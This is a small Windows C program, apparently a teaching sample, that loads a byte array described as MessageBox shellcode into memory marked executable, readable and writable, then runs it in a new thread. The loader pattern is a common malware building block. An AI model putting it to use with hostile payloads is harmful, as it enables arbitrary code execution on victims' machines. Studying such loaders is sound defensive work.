#include <Windows.h>
#include <stdio.h>

int main(int argc, char** argv) {
    // Define MessageBox shellcode (x64)
    unsigned char shellcode[] =
        "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x00\x20\x60\x00\x00"
        "\x00\x00\x00\x48\x31\xc0\x50\x53\x51\x56\x48\x89\xe6\x48"
        "\x83\xec\x20\x48\x8d\x35\x45\xff\xff\xff\x48\x8d\x3d\x2e"
        "\xff\xff\xff\xb0\x31\x48\x31\xd2\x48\x8b\x0c\x17\x48\x8b"
        "\x41\x10\x8b\x40\x3c\x83\xf8\x00\x74\x02\xeb\x14\x8b\x40"
        "\x28\x8b\x40\x40\x48\x01\xd8\x0f\xb7\x0c\x48\x8d\x42\x01"
        "\x49\x89\xd1\x48\x89\xc2\x48\x83\xc2\x02\x48\x01\xd0\x48"
        "\x83\xc0\x04\x48\xff\xc0\x75\xe2\x48\x83\xc4\x20\x5e\x5b"
        "\x59\x5f\x5f\x5d\xc3";
    // Allocate memory using VirtualAlloc
    LPVOID allocated_mem = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    if (allocated_mem == NULL) {
		printf("Failed to allocate memory: %d\n", GetLastError());
        return 1;
    }

    printf("Memory Allocated at address: 0x%p\n", allocated_mem);
    // Write shellcode to the allocated memory
    RtlCopyMemory(allocated_mem, shellcode, sizeof(shellcode));

    printf("Shellcode is written to allocated memory!\n");
    // Create thread to execute the MessageBox shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

    if (hThread == NULL) {
		printf("Failed to create thread: %d\n", GetLastError());
        return 1;
    }
    // Halt execution until created thread returns
    WaitForSingleObject(hThread, INFINITE);
    // Close handle to thread
    CloseHandle(hThread);
    // Free allocated memory
    VirtualFree(allocated_mem, 0, MEM_RELEASE);

    return 0;
}